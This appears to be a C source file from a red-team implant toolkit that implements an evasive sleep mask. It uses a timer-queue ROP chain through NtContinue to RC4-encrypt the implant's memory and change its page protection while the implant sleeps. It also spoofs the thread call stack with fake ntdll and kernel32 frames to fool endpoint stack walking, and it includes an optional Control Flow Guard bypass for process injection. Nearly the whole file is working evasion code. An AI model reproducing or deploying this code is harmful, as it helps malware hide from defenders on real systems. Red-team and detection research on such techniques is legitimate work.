/*
   Helper function to obfuscate the sleep mask code using CreateTimerQueueTimer.

   Credits:
      https://github.com/Cracked5pider/Ekko
      https://suspicious.actor/2022/05/05/mdsec-nighthawk-study.html
      Originally discovered by Peter Winter-Smith and used in MDSec’s Nighthawk

   Stack spoofing code:
      https://github.com/WithSecureLabs/CallStackSpoofer
*/

#ifdef _WIN64

/*
 *   Enable the CFG bypass technique which is needed to inject into processes
 *   protected Control Flow Guard (CFG) on supported version of Windows.
 */
#define CFG_BYPASS 0
#if CFG_BYPASS
#include "cfg.c"
#endif

#define intAlloc(size) HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, size)
#define RVA(type, base_addr, rva) (type)(ULONG_PTR)((ULONG_PTR) base_addr + rva)

#define MAX_FRAME_NUM 10
#define RBP_OP_INFO 0x5

typedef PRUNTIME_FUNCTION(NTAPI* RtlLookupFunctionEntry_t)(DWORD64 ControlPc, PDWORD64 ImageBase, PUNWIND_HISTORY_TABLE HistoryTable);

/*
 * Used to store information for individual stack frames for call stack to spoof.
 */
typedef struct _STACK_FRAME {
    WCHAR targetDll[MAX_PATH];
    DWORD functionHash;
    ULONG offset;
    ULONG totalStackSize;
    BOOL requiresLoadLibrary;
    BOOL setsFramePointer;
    PVOID returnAddress;
    BOOL pushRbp;
    ULONG countOfCodes;
    BOOL pushRbpIndex;
} STACK_FRAME, *PSTACK_FRAME;

/*
 *  Unwind op codes: https://docs.microsoft.com/en-us/cpp/build/exception-handling-x64?view=msvc-170
 */
typedef enum _UNWIND_OP_CODES {
    UWOP_PUSH_NONVOL = 0, /* info == register number */
    UWOP_ALLOC_LARGE,     /* no info, alloc size in next 2 slots */
    UWOP_ALLOC_SMALL,     /* info == size of allocation / 8 - 1 */
    UWOP_SET_FPREG,       /* no info, FP = RSP + UNWIND_INFO.FPRegOffset*16 */
    UWOP_SAVE_NONVOL,     /* info == register number, offset in next slot */
    UWOP_SAVE_NONVOL_FAR, /* info == register number, offset in next 2 slots */
    UWOP_SAVE_XMM128 = 8, /* info == XMM reg number, offset in next slot */
    UWOP_SAVE_XMM128_FAR, /* info == XMM reg number, offset in next 2 slots */
    UWOP_PUSH_MACHFRAME   /* info == 0: no error-code, 1: error-code */
} UNWIND_CODE_OPS;

typedef unsigned char UBYTE;

typedef union _UNWIND_CODE {
    struct {
        UBYTE CodeOffset;
        UBYTE UnwindOp : 4;
        UBYTE OpInfo   : 4;
    };
    USHORT FrameOffset;
} UNWIND_CODE, *PUNWIND_CODE;

typedef struct _UNWIND_INFO {
    UBYTE Version       : 3;
    UBYTE Flags         : 5;
    UBYTE SizeOfProlog;
    UBYTE CountOfCodes;
    UBYTE FrameRegister : 4;
    UBYTE FrameOffset   : 4;
    UNWIND_CODE UnwindCode[1];
} UNWIND_INFO, *PUNWIND_INFO;

void set_frame_info(
    OUT PSTACK_FRAME frame,
    IN LPWSTR path,
    IN DWORD api_hash,
    IN ULONG target_offset,
    IN ULONG target_stack_size,
    IN BOOL dll_load)
{
    memset(frame, 0, sizeof(STACK_FRAME));
    lstrcpyW(frame->targetDll, path) ;
    frame->functionHash = api_hash;
    frame->offset = target_offset;
    frame->totalStackSize = target_stack_size;
    frame->requiresLoadLibrary = dll_load;
    frame->setsFramePointer = FALSE;
    frame->returnAddress = 0;
    frame->pushRbp = FALSE;
    frame->countOfCodes = 0;
    frame->pushRbpIndex = 0;
}

void set_callstack(
    IN PSTACK_FRAME callstack,
    OUT PDWORD number_of_frames)
{
    DWORD i = 0;

    /*
     *  How to choose your call stack to spoof.
     *  Steps:
     *     1. Use process hacker or similar utility on a representative
     *        Windows target system to find a stack you want to spoof.
     *        Note: Different versions of windows may have different offsets.
     *     2. Use the module, function and offset information as input
     *        to the getFunctionOffset utility located in arsenal-kit/utils.
     *     3. The getFunctionOffset utility outputs information including
     *        the code to use in this function.
     *  Note: Should look for a stack with NtWaitForSingleObject at the top.
     *        Then use the information for the remaining stack frames.
     *  Note: The module extension is optional.
     *
     *  Using the getFunctionOffset helper utility to generate the code.
     *     getFunctionOffset.exe ntdll.dll TpReleasePool 0x402
     *     getFunctionOffset.exe kernel32.dll BaseThreadInitThunk 0x14
     *     getFunctionOffset.exe ntdll RtlUserThreadStart 0x21
     *
     *  Note: The number of frames can not exceed the MAX_FRAME_NUM value.
     */
    set_frame_info(&callstack[i++], L"ntdll.dll", 0, 0x550b2, 0, FALSE);
    set_frame_info(&callstack[i++], L"kernel32.dll", 0, 0x174b4, 0, FALSE);
    set_frame_info(&callstack[i++], L"ntdll", 0, 0x526a1, 0, FALSE);

    *number_of_frames = i;
}

BOOL calculate_return_address(
    IN OUT PSTACK_FRAME frame)
{
    PVOID image_base = NULL;

    // get library base address
    image_base = GetModuleHandleW(frame->targetDll);
    if (!image_base)
        image_base = LoadLibraryW(frame->targetDll);
    if (!image_base)
    {
        return FALSE;
    }

    // set the return address as image_base + offset
    frame->returnAddress = RVA(PVOID, image_base, frame->offset);

    return TRUE;
}

/*
 * Calculates the total stack space used by the fake stack frame. Uses
 * a minimal implementation of RtlVirtualUnwind to parse the unwind codes
 * for target function and add up total stack size. Largely based on:
 * https://github.com/hzqst/unicorn_pe/blob/master/unicorn_pe/except.cpp#L773
 */
BOOL calculate_function_stack_size_internal(
    IN OUT PSTACK_FRAME frame,
    PRUNTIME_FUNCTION pRuntimeFunction,
    DWORD64 image_base)
{
    PUNWIND_INFO pUnwindInfo = NULL;
    ULONG unwindOperation = 0;
    ULONG operationInfo = 0;
    ULONG index = 0;
    ULONG frameOffset = 0;
    BOOL success = TRUE;

    do
    {
        pUnwindInfo = NULL;
        unwindOperation = 0;
        operationInfo = 0;
        index = 0;
        frameOffset = 0 ;
        success = TRUE;
        /*
         * [1] Loop over unwind info.
         * NB As this is a PoC, it does not handle every unwind operation, but
         * rather the minimum set required to successfully mimic the default
         * call stacks included.
         */
        pUnwindInfo = (PUNWIND_INFO)(pRuntimeFunction->UnwindData + image_base);
        while (index < pUnwindInfo->CountOfCodes)
        {
            unwindOperation = pUnwindInfo->UnwindCode[index].UnwindOp;
            operationInfo = pUnwindInfo->UnwindCode[index].OpInfo;
            /*
             * [2] Loop over unwind codes and calculate
             * total stack space used by target function.
             */
            if (unwindOperation == UWOP_PUSH_NONVOL)
            {
                // UWOP_PUSH_NONVOL is 8 bytes.
                frame->totalStackSize += 8;
                // Record if it pushes rbp as
                // this is important for UWOP_SET_FPREG.
                if (RBP_OP_INFO == operationInfo)
                {
                    frame->pushRbp = TRUE;
                    // Record when rbp is pushed to stack.
                    frame->countOfCodes = pUnwindInfo->CountOfCodes;
                    frame->pushRbpIndex = index + 1;
                }
            }
            else if (unwindOperation == UWOP_SAVE_NONVOL)
            {
                // UWOP_SAVE_NONVOL doesn't contribute to stack size
                // but you do need to increment index.
                index += 1;
            }
            else if (unwindOperation == UWOP_ALLOC_SMALL)
            {
                //Alloc size is op info field * 8 + 8.
                frame->totalStackSize += ((operationInfo * 8) + 8);
            }
            else if (unwindOperation == UWOP_ALLOC_LARGE)
            {
                // Alloc large is either:
                // 1) If op info == 0 then size of alloc / 8
                // is in the next slot (i.e. index += 1).
                // 2) If op info == 1 then size is in next
                // two slots.
                index += 1;
                frameOffset = pUnwindInfo->UnwindCode[index].FrameOffset;
                if (operationInfo == 0)
                {
                    frameOffset *= 8;
                }
                else
                {
                    index += 1;
                    frameOffset += (pUnwindInfo->UnwindCode[index].FrameOffset << 16);
                }
                frame->totalStackSize += frameOffset;
            }
            else if (unwindOperation == UWOP_SET_FPREG)
            {
                // This sets rsp == rbp (mov rsp,rbp), so we need to ensure
                // that rbp is the expected value (in the frame above) when
                // it comes to spoof this frame in order to ensure the
                // call stack is correctly unwound.
                frame->setsFramePointer = TRUE;
            }
            else
            {
                success = FALSE;
            }
            index += 1;
        }
        if (!success)
            return FALSE;

        // If chained unwind information is present then we need to
        // also recursively parse this and add to total stack size.
        if (pUnwindInfo->Flags & UNW_FLAG_CHAININFO)
        {
            index = pUnwindInfo->CountOfCodes;
            if (0 != (index & 1))
            {
                index += 1;
            }
            pRuntimeFunction = (PRUNTIME_FUNCTION)(&pUnwindInfo->UnwindCode[index]);
        }
    } while(pUnwindInfo->Flags & UNW_FLAG_CHAININFO);

    // Add the size of the return address (8 bytes).
    frame->totalStackSize += 8;

    return TRUE;
}

/*
 * Retrieves the runtime function entry for given fake ret address
 * and calls CalculateFunctionStackSize, which will recursively
 * calculate the total stack space utilisation.
 */
BOOL calculate_function_stack_size(
    IN OUT PSTACK_FRAME frame)
{
    DWORD64 ImageBase = 0;
    PUNWIND_HISTORY_TABLE pHistoryTable = NULL;
    PRUNTIME_FUNCTION pRuntimeFunction = NULL;
    // [1] Locate RUNTIME_FUNCTION for given function.
    pRuntimeFunction = RtlLookupFunctionEntry(
        (DWORD64)frame->returnAddress,
        &ImageBase,
        pHistoryTable);
    if (!pRuntimeFunction)
    {
        return FALSE;
    }

    /*
     * [2] Recursively calculate the total stack size for
     * the function we are "returning" to
     */
    return calculate_function_stack_size_internal(
        frame,
        pRuntimeFunction,
        ImageBase);
}

/*
 * Takes a target call stack and configures it ready for use
 * via loading any required dlls, resolving module addresses
 * and calculating spoofed return addresses.
 */
BOOL initialize_spoofed_callstack(
    PSTACK_FRAME callstack,
    DWORD number_of_frames)
{
    PSTACK_FRAME frame = NULL;

    for (DWORD i = 0; i < number_of_frames; i++)
    {
        frame = &callstack[i];

        // [1] Calculate ret address for current stack frame.
        if (!calculate_return_address(frame))
        {
            return FALSE;
        }

        // [2] Calculate the total stack size for ret function.
        if (!calculate_function_stack_size(frame))
        {
            return FALSE;
        }
    }

    return TRUE;
}

/*
 *  Pushes a value to the stack of a Context structure.
 */
void push_to_stack(
    PCONTEXT context,
    ULONG64 value)
{
    context->Rsp -= 0x8;
    *(PULONG64)(context->Rsp) = value;
}

void initialize_fake_thread_state(
    PSTACK_FRAME callstack,
    DWORD number_of_frames,
    PCONTEXT context)
{
    ULONG64 childSp = 0;
    BOOL bPreviousFrameSetUWOP_SET_FPREG = FALSE;
    PSTACK_FRAME stackFrame = NULL;

    // As an extra sanity check explicitly clear
    // the last RET address to stop any further unwinding.
    push_to_stack(context, 0);

    // [2] Loop through target call stack *backwards*
    // and modify the stack so it resembles the fake
    // call stack e.g. essentially making the top of
    // the fake stack look like the diagram below:
    //      |                |
    //       ----------------
    //      |  RET ADDRESS   |
    //       ----------------
    //      |                |
    //      |     Unwind     |
    //      |     Stack      |
    //      |      Size      |
    //      |                |
    //       ----------------
    //      |  RET ADDRESS   |
    //       ----------------
    //      |                |
    //      |     Unwind     |
    //      |     Stack      |
    //      |      Size      |
    //      |                |
    //       ----------------
    //      |   RET ADDRESS  |
    //       ----------------   <--- RSP when NtOpenProcess is called
    //
    for (DWORD i = 0; i < number_of_frames; i++)
    {
        // loop from the last to the first
        stackFrame = &callstack[number_of_frames - i - 1];

        // [2.1] Check if the last frame set UWOP_SET_FPREG.
        // If the previous frame uses the UWOP_SET_FPREG
        // op, it will reset the stack pointer to rbp.
        // Therefore, we need to find the next function in
        // the chain which pushes rbp and make sure it writes
        // the correct value to the stack so it is propagated
        // to the frame after that needs it (otherwise stackwalk
        // will fail). The required value is the childSP
        // of the function that used UWOP_SET_FPREG (i.e. the
        // value of RSP after it is done adjusting the stack and
        // before it pushes its RET address).
        if (bPreviousFrameSetUWOP_SET_FPREG && stackFrame->pushRbp)
        {
            // [2.2] Check when RBP was pushed to the stack in function
            // prologue. UWOP_PUSH_NONVOls will always be last:
            // "Because of the constraints on epilogs, UWOP_PUSH_NONVOL
            // unwind codes must appear first in the prolog and
            // correspondingly, last in the unwind code array."
            // Hence, subtract the push rbp code index from the
            // total count to work out when it is pushed onto stack.
            // E.g. diff will be 1 below, so rsp -= 0x8 then write childSP:
            // RPCRT4!LrpcIoComplete:
            // 00007ffd`b342b480 4053            push    rbx
            // 00007ffd`b342b482 55              push    rbp
            // 00007ffd`b342b483 56              push    rsi
            // If diff == 0, rbp is pushed first etc.
            DWORD diff = stackFrame->countOfCodes - stackFrame->pushRbpIndex;
            DWORD tmpStackSizeCounter = 0;
            for (ULONG j = 0; j < diff; j++)
            {
                // e.g. push rbx
                push_to_stack(context, 0x0);
                tmpStackSizeCounter += 0x8;
            }

            // push rbp
            push_to_stack(context, childSp);

            // [2.3] Minus off the remaining function stack size
            // and continue unwinding.

            context->Rsp -= (stackFrame->totalStackSize - (tmpStackSizeCounter + 0x8));
            *(PULONG64)(context->Rsp) = (ULONG64)stackFrame->returnAddress;

            // [2.4] From my testing it seems you only need to get rbp
            // right for the next available frame in the chain which pushes it.
            // Hence, there can be a frame in between which does not push rbp.
            // Ergo set this to false once you have resolved rbp for frame
            // which needed it. This is pretty flimsy though so this assumption
            // may break for other more complicated examples.
            bPreviousFrameSetUWOP_SET_FPREG = FALSE;
        }
        else
        {
            // [3] If normal frame, decrement total stack size
            // and write RET address.
            context->Rsp -= stackFrame->totalStackSize;
            *(PULONG64)(context->Rsp) = (ULONG64)stackFrame->returnAddress;
        }

        // [4] Check if the current function sets frame pointer
        // when unwinding e.g. mov rsp,rbp / UWOP_SET_FPREG
        // and record its childSP.
        if (stackFrame->setsFramePointer)
        {
            childSp = context->Rsp;
            childSp += 0x8;
            bPreviousFrameSetUWOP_SET_FPREG = TRUE;
        }
    }
}

CONTEXT context = {};
PSTACK_FRAME gcallstack = NULL;
DWORD number_of_frames = 0;
void spoof_stack(DWORD *threadId)
{
    CONTEXT context2 = {};

    /* Initialize the information once */
    if (gcallstack == NULL) {
        gcallstack = intAlloc(sizeof(STACK_FRAME) * MAX_FRAME_NUM);

        set_callstack(gcallstack, &number_of_frames);

        initialize_spoofed_callstack(gcallstack, number_of_frames);
    }

    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, *threadId);

    context.ContextFlags = CONTEXT_FULL;
    GetThreadContext(hThread, &context);
    memcpy(&context2, &context, sizeof(CONTEXT));

    initialize_fake_thread_state(gcallstack, number_of_frames, &context2);

    SetThreadContext(hThread, &context2);
}

void restore_stack(DWORD *threadId)
{
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, 0, *threadId);

    SetThreadContext(hThread, &context);
}

void ___chkstk_ms() { /* needed to resolve linker errors for bof_extract */ }

void evasive_sleep(char * mask, DWORD time) {
    CONTEXT CtxThread = { 0 };
    CONTEXT RopProtRW = { 0 };
    CONTEXT RopMemMsk = { 0 };
    CONTEXT RopProtRX = { 0 };
    CONTEXT RopSetEvt = { 0 };

    HANDLE  hTimerQueue = NULL;
    HANDLE  hNewTimer = NULL;
    HANDLE  hEvent = NULL;
    PVOID   ImageBase = base_location;
    DWORD   ImageSize = 0x1000;
    DWORD   OldProtect = 0;
    DWORD   threadId;

    USTRING Key = { 0 };
    USTRING Img = { 0 };

#if CFG_BYPASS
    /* Using this variable which is not set 1st time through to only do the CFG bypass once */
    if (gcallstack == NULL) {
       markCFGValid_nt(NtContinue);
    }
#endif

    /* setup the parameters to the functions */
    Key.Buffer = mask;
    Key.Length = Key.MaximumLength = MASK_SIZE;
    Img.Buffer = ImageBase;
    Img.Length = Img.MaximumLength = 2 * ImageSize;

    threadId = GetCurrentThreadId();
    hEvent = CreateEventA(0, 0, 0, 0);
    hTimerQueue = CreateTimerQueue();

    if (hEvent && hTimerQueue && CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) RtlCaptureContext, &CtxThread, 0, 0, WT_EXECUTEINTIMERTHREAD)) {

        WaitForSingleObject(hEvent, 0x32); // This is needed

        /* Setup the function calls to be added to the queue timer */
        memcpy(&RopProtRW, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopMemMsk, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopProtRX, &CtxThread, sizeof(CONTEXT));
        memcpy(&RopSetEvt, &CtxThread, sizeof(CONTEXT));

	     // VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
        RopProtRW.Rsp -= 8;
        RopProtRW.Rip = (DWORD_PTR) VirtualProtect;
        RopProtRW.Rcx = (DWORD_PTR) ImageBase;
        RopProtRW.Rdx = ImageSize;
        RopProtRW.R8 = PAGE_READWRITE;
        RopProtRW.R9 = (DWORD_PTR) &OldProtect;

        // SystemFunction032( &Key, &Img );
        RopMemMsk.Rsp -= 8;
        RopMemMsk.Rip = (DWORD_PTR) SystemFunction032;
        RopMemMsk.Rcx = (DWORD_PTR) &Img;
        RopMemMsk.Rdx = (DWORD_PTR) &Key;

        // VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READ, &OldProtect );
        RopProtRX.Rsp -= 8;
        RopProtRX.Rip = (DWORD_PTR) VirtualProtect;
        RopProtRX.Rcx = (DWORD_PTR) ImageBase;
        RopProtRX.Rdx = ImageSize;
        RopProtRX.R8 = PAGE_EXECUTE_READ;
        RopProtRX.R9 = (DWORD_PTR)&OldProtect;

        // SetEvent( hEvent );
        RopSetEvt.Rsp -= 8;
        RopSetEvt.Rip = (DWORD_PTR) SetEvent;
        RopSetEvt.Rcx = (DWORD_PTR) hEvent;

        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) spoof_stack, &threadId, 100, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopProtRW, 200, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopMemMsk, 300, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopMemMsk, 400 + time, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopProtRX, 500 + time, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) restore_stack, &threadId, 600 + time, 0, WT_EXECUTEINTIMERTHREAD);
        CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK) NtContinue, &RopSetEvt, 700 + time, 0, WT_EXECUTEINTIMERTHREAD);

        WaitForSingleObject(hEvent, INFINITE);
    } else {
        WaitForSingleObject(GetCurrentProcess(), time);
    }

    /* cleanup */
    if (hEvent)      { CloseHandle(hEvent); }
    if (hTimerQueue) { DeleteTimerQueue(hTimerQueue); }
}
#endif
